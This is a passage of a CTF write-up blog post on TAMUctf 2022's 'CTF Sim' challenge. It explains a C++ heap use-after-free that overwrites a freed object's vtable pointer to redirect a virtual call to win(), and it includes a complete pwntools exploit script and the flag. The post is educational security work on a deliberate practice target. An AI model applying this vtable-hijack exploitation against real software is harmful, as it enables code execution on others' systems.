data-continuation-prompt=">" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt="gef>"></span><span data-continuation-prompt=">"></span><span data-continuation-prompt=">"></span><span data-continuation-prompt=">"></span></span><span class="token command">c  </span>
<span class="token command"><span class="token number">3</span>  </span>
<span class="token command"><span class="token number">16</span>  </span>
<span class="token command">AABBCCDD</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-1308w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-1308w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1308 / 358" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-6-input-3-1308w.webp 1308w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1308px"></a></p><p>Let's check our heap.</p><div class="code-toolbar"><pre data-language="GDB" class="command-line language-sh" data-prompt=">" data-continuation-prompt="gef>" data-continuation-str="  " tabindex="0"><code class="language-sh"><span class="command-line-prompt"><span data-prompt=">"></span><span data-continuation-prompt="gef>"></span></span><span class="token command">^C  </span>
<span class="token command">heap chunks</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">GDB</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-1314w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-1314w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1314 / 394" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-7-heap-after-input-3-1314w.webp 1314w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1314px"></a></p><p>Sweet! We've overwritten the first 8 bytes of the chunk with our payload. Effectively, we've assigned a custom vptr to the <code>forensics</code> object.</p><p>"But bruh I thought our <code>forensics</code> object was deallocated!"</p><p>Well yes... but actually no... Objects in C/C++ are merely represented in memory as a sequence of bytes. You can interpret a sequence of bytes as any type. That's why casting across types is a thing in C/C++—albeit potentially dangerous. (In C, you'd use the usual cast <code>(type*)&amp;obj</code>. In C++, you'd use <code>reinterpret_cast&lt;type*&gt;(&amp;obj)</code>.)</p><p>Now when we call <code>solveChallenge</code>, the line <code>downloaded[index]-&gt;solve()</code> will treat our chunk as a <code>challenge*</code>. It was originally <em>supposed</em> to be a <code>char*</code>, since we submitted a writeup. But since types don't matter in the assembly/memory level, the chunk is now a <code>challenge*</code> for all intents and purposes.</p><p>Since the chunk is treated as a <code>challenge*</code>, the assembly will try to double-deref the vptr... which is our payload from submitting the writeup.</p><p>Boom! Exploit.</p><p>If we continue running the program, a SIGSEGV occurs since it tries to dereference <code>0x4444434342424141</code> (which is <code>"AABBCCDD"</code>, but packed to 64 bits).</p><p><a class="lightbox-single" title="" href="/img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-1324w.webp"><img class="mb-2 rw center jw-100" src="/img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-1324w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 1324 / 542" alt="undefined" title="undefined" srcset="/img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-256w.webp 256w, /img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-512w.webp 512w, /img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-1024w.webp 1024w, /img/posts/ctf/tamuctf22/assets/ctf-sim-9-sigsev-1324w.webp 1324w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, (max-width: 1024px) 1024px, 1324px"></a></p><p>Later on, we'll use <code>win_addr</code> instead of <code>"AABBCCDD"</code> for our payload; so that when the <code>solve()</code> virtual function does its magic, it will call <code>win()</code> instead.</p><h4 id="altogether" tabindex="-1"><a class="md-anchor" href="#altogether" aria-hidden="true"></a> Altogether</h4><p>Combining our knowledge of vtables/vpointers with a little bit of heap knowledge, we come up with the following exploit:</p><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token comment"># downloaded[0] = new forensics;   (vptr points to forensic's vtable.)</span>
download_chal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Chunk is allocated-- reusing the chunk previously deallocated.</span>
<span class="token comment"># Overwrite vptr of downloaded[0] with &amp;(&amp;win).</span>
submit_writeup<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>

<span class="token comment"># downloaded[0]-&gt;solve() triggers double dereference (due to virtual function resolution) and calls win()!</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><p>To explain the "little bit of heap knowledge", we just need to understand that C++'s <code>new</code>/<code>delete</code> behaves like C's <code>malloc</code>/<code>free</code>: <code>new</code> will allocate a chunk, and <code>delete</code> will move the chunk to a bin. There are tons of different bins (small, large, fast, unsorted). But intuitively, the next <code>new</code> with a similar chunk size will reuse the chunk, meaning we overwrite the same memory previously allocated!</p><p>This story is reflected in the code above.</p><ul><li>We download a challenge. This will <code>new</code> a chunk. The index and type of challenge (<code>forensic</code>, <code>pwn</code>, etc.) don't really matter, but just make sure we keep reusing the same index.</li><li>We solve a challenge. Here we <code>delete</code> the chunk previously allocated.</li><li>We submit a writeup. This <code>malloc</code>s a chunk and inserts a payload of <code>win_addr</code>.<ul><li>The size to malloc can be anywhere between <code>0x8</code> (exclusive) and <code>0x18</code> (inclusive). I used <code>0x10</code> since it looks pretty.</li><li>Anything equal or less than <code>0x8</code> means our 8-byte payload will be cut off early. All 8 bytes are important, because the vptr machinery will be using the entire 8 bytes.</li><li>Anything above <code>0x18</code> will allocate a new chunk instead of reusing the previously deallocated chunk.</li></ul></li><li>We solve the same challenge as before. This triggers a call to a virtual function which double-derefs our payload (<code>win_addr</code>), calling <code>win()</code> and giving us a shell. PROFIT!</li></ul><h3 id="solve-scripts" tabindex="-1"><a class="md-anchor" href="#solve-scripts" aria-hidden="true"></a> Solve Scripts</h3><div class="code-toolbar"><pre class="language-py" tabindex="0"><code class="language-py"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

binary <span class="token operator">=</span> <span class="token string">'ctf_sim'</span>

context<span class="token punctuation">.</span>binary <span class="token operator">=</span> binary
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"tamuctf.com"</span><span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> sni<span class="token operator">=</span><span class="token string">"ctf-sim"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">download_chal</span><span class="token punctuation">(</span>category<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span> save_index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;=</span> category <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;=</span> save_index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>category<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>save_index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">solve_chal</span><span class="token punctuation">(</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;=</span> index <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad"</span><span class="token punctuation">)</span>
    
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">submit_writeup</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> length<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> length <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;=</span> length<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"your math bad bad"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> <span class="token string">b'\n'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RuntimeError<span class="token punctuation">(</span><span class="token string">"bad bad newline"</span><span class="token punctuation">)</span>

    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"&gt; "</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>

<span class="token comment"># downloaded[0] = new forensics;   (vptr points to forensic's vtable.)</span>
download_chal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># delete downloaded[0];    (chunk is moved to tcache/fast bin. downloaded[0] itself is unchanged!)</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token comment"># Chunk is allocated-- reusing the chunk previously deallocated.</span>
<span class="token comment"># Overwrite vptr of downloaded[0] with &amp;(&amp;win).</span>
submit_writeup<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'win_addr'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>

<span class="token comment"># downloaded[0]-&gt;solve() triggers double dereference (due to virtual function resolution) and calls win()!</span>
solve_chal<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><div class="toolbar"><div class="toolbar-item"><span class="lang">Python</span></div><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div><h3 id="flag" tabindex="-1"><a class="md-anchor" href="#flag" aria-hidden="true"></a> Flag</h3><div class="code-toolbar"><pre data-lang-off="" class="language-text" tabindex="0"><code class="language-text">gigem{h34pl355_1n_53477l3}</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" title="Copy Code"></button></div></div></div></div><a id="end-of-article"></a><br><script defer src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><div class="post-share dim-gentle mb-3 d-flex flex-row align-items-center"><div class="d-flex flex-row flex-wrap align-items-center gap-3"><span>Share&nbsp;on</span> <a class="no-decoration" data-sharer="reddit" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-reddit"></i> </span></a><a class="no-decoration" data-sharer="telegram" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-telegram"></i> </span></a><a class="no-decoration" data-sharer="whatsapp" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-whatsapp"></i> </span></a><a class="no-decoration" data-sharer="linkedin" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-linkedin"></i> </span></a><a class="no-decoration" data-sharer="vk" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-vk"></i> </span></a><a class="no-decoration" data-sharer="twitter" data-title="TAMUctf 2022 – CTF Sim" data-url="/posts/tamuctf-2022-ctf-sim/"><span class="fs-4"><i class="fab fa-twitter"></i> </span></a><a id="copy-link-button" class="no-decoration" data-bs-toggle="tooltip" data-bs-trigger="click" title="Link copied!"><span class="fs-4"><i class="fas fa-link"></i></span></a></div></div><hr><div id="post-author-container" class="d-flex justify-content-between align-items-center gap-3" itemprop="author" itemscope itemtype="https://schema.org/Person"><img src="/img/profile-icon.jpg" class="profile-img" alt="" loading="lazy" decoding="async" itemprop="image"><div class="author-info d-flex flex-column gap-1"><p class="profile-name" itemprop="name">TrebledJ</p><p class="profile-bio" itemprop="description">Passionate problem-solver, pentester, and autodidact. I thrive on learning new things and enjoy passing it on. When not immersed in bughunting or programming, I can be found taking walks, composing a short tune, and occasionally indulging in CTF challenges.</p></div></div><hr class="section-sep"><div id="related" class="jw-100"><h3><i class="fas fa-circle-nodes me-2"></i>Related Posts</h3><div class="row gx-3 mt-4"><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/abusing-server-side-rendering-in-drogon/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/abusing-server-side-rendering-in-drogon/"><img class="post-img-blurred-bg" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for Dynamic Views Loading – Abusing Server Side Rendering in Drogon" srcset="/img/posts/infosec/drogon-csp/assets/drogon-thumbnail-256w.webp 256w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-512w.webp 512w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1024w.webp 1024w, /img/posts/infosec/drogon-csp/assets/drogon-thumbnail-1600w.webp 1600w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">Dynamic Views Loading – Abusing Server Side Rendering in Drogon</h2><div class="post-summary"><p>What could go wrong releasing a C++ web server with "live reload" into the wild?</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/cpp/" itemprop="keywords">cpp</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/attack-of-the-zip/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/attack-of-the-zip/"><img class="post-img-blurred-bg" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 500 / 337" alt="Thumbnail for From Compression to Compromise: Unmasking Zip File Threats" srcset="/img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-256w.webp 256w, /img/posts/infosec/attack-of-the-zip/assets/attack-of-the-zip-thumbnail-500w.webp 500w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 500px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">From Compression to Compromise: Unmasking Zip File Threats</h2><div class="post-summary"><p>Deep dive into zip file attacks and mitigations (with examples!).</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a> </span><span><a class="jtag" href="/tags/notes/" itemprop="keywords">notes</a> </span><span><a class="jtag" href="/tags/web/" itemprop="keywords">web</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/hkcert-2023-decompetition-vitamin-cpp/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/hkcert-2023-decompetition-vitamin-cpp/"><img class="post-img-blurred-bg" src="/img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++" srcset="/img/posts/ctf/hkcert23/assets/vitamin-cpp-256w.webp 256w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp 512w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-640w.webp 640w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 288" alt="Thumbnail for HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++" srcset="/img/posts/ctf/hkcert23/assets/vitamin-cpp-256w.webp 256w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-512w.webp 512w, /img/posts/ctf/hkcert23/assets/vitamin-cpp-640w.webp 640w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">HKCERT CTF 2023 – Decompetition: Vitamin&nbsp;C++</h2><div class="post-summary"><p>A beginner-friendly writeup to reverse-engineering C++ a lá decompetition. Years of complex shenanigans condensed!</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/subtype-metaprogramming-is-mostly-harmless/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/subtype-metaprogramming-is-mostly-harmless/"><img class="post-img-blurred-bg" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 249" alt="Thumbnail for N[Subtype Metaprogramming] is N[Mostly Harmless]" srcset="/img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-256w.webp 256w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-512w.webp 512w, /img/posts/programming/concepts/subtype-metaprogramming/assets/thumbnail-804w.webp 804w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title"><sub><sup>N[</sup></sub>Subtype Metaprogramming<sub><sup>]</sup></sub> is <sub><sup>N[</sup></sub>Mostly Harmless<sub><sup>]</sup></sub></h2><div class="post-summary"><p>Inheritance go brrrrrrrr... abusing turing-complete typesystems to write fun programs in Python.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/types/" itemprop="keywords">types</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/hitcon-2023-the-blade/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/hitcon-2023-the-blade/"><img class="post-img-blurred-bg" src="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 206" alt="Thumbnail for HITCON 2023 – The Blade" srcset="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-256w.webp 256w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp 512w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1024w.webp 1024w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1570w.webp 1570w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 206" alt="Thumbnail for HITCON 2023 – The Blade" srcset="/img/posts/ctf/hitcon23/assets/hitcon-thumbnail-256w.webp 256w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-512w.webp 512w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1024w.webp 1024w, /img/posts/ctf/hitcon23/assets/hitcon-thumbnail-1570w.webp 1570w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">HITCON 2023 – The Blade</h2><div class="post-summary"><p>Beginner-friendly writeup for a nifty Rust reversing challenge.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/ctf/" itemprop="keywords">ctf</a> </span><span><a class="jtag" href="/tags/writeup/" itemprop="keywords">writeup</a> </span><span><a class="jtag" href="/tags/reverse/" itemprop="keywords">reverse</a></span></div></div></div></div></article></div><div class="related-col-flex-auto-4"><article class="post-minified-preview"><a href="/posts/gdb-cheatsheet/"></a><div class="d-flex flex-column"><a class="post-thumbnail" href="/posts/gdb-cheatsheet/"><img class="post-img-blurred-bg" src="/img/posts/programming/cheatsheets/assets/gef-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 250" alt="Thumbnail for GDB/GEF Cheatsheet" srcset="/img/posts/programming/cheatsheets/assets/gef-256w.webp 256w, /img/posts/programming/cheatsheets/assets/gef-512w.webp 512w, /img/posts/programming/cheatsheets/assets/gef-906w.webp 906w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"><div class="post-img-container d-flex jw-100 h-100"><img class="post-img-contain" src="/img/posts/programming/cheatsheets/assets/gef-512w.webp" loading="lazy" decoding="async" style="aspect-ratio: auto 512 / 250" alt="Thumbnail for GDB/GEF Cheatsheet" srcset="/img/posts/programming/cheatsheets/assets/gef-256w.webp 256w, /img/posts/programming/cheatsheets/assets/gef-512w.webp 512w, /img/posts/programming/cheatsheets/assets/gef-906w.webp 906w" sizes="(max-width: 256px) 256px, (max-width: 512px) 512px, 512px"></div></a><div class="post-content d-flex flex-column justify-content-between"><div><h2 class="post-title">GDB/GEF Cheatsheet</h2><div class="post-summary"><p>Quick command reference on one of the most powerful tools for dynamic analysis.</p></div></div><div class="metadata-tag-container d-flex flex-row align-items-top"><div class="tag-list mt-2 d-flex flex-row flex-wrap align-items-center"><span><a class="jtag" href="/tags/programming/" itemprop="keywords">programming</a> </span><span><a class="jtag" href="/tags/cheatsheet/" itemprop="keywords">cheatsheet</a> </span><span><a class="jtag" href="/tags/infosec/" itemprop="keywords">infosec</a></span></div></div></div></div></article></div></div><hr><h3><i class="fas fa-tags me-2"></i>Related Tags</h3><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to cpp, python">software.programming-language</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/cpp/">cpp</a> <a class="jtag" href="/tags/python/">python</a> <a class="jtag" href="/tags/c/">c</a> <a class="jtag" href="/tags/haskell/">haskell</a> <a class="jtag" href="/tags/js/">js</a> <a class="jtag" href="/tags/qt/">qt</a> <a class="jtag" href="/tags/rust/">rust</a> <a class="jtag" href="/tags/qml/">qml</a> <a class="jtag" href="/tags/sql/">sql</a> <a class="jtag" href="/tags/scala/">scala</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to ctf, pwn">software.security</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/ctf/">ctf</a> <a class="jtag" href="/tags/infosec/">infosec</a> <a class="jtag" href="/tags/reverse/">reverse</a> <a class="jtag" href="/tags/pentesting/">pentesting</a> <a class="jtag" href="/tags/pwn/">pwn</a> <a class="jtag" href="/tags/cryptography/">cryptography</a> <a class="jtag" href="/tags/redteam/">redteam</a> 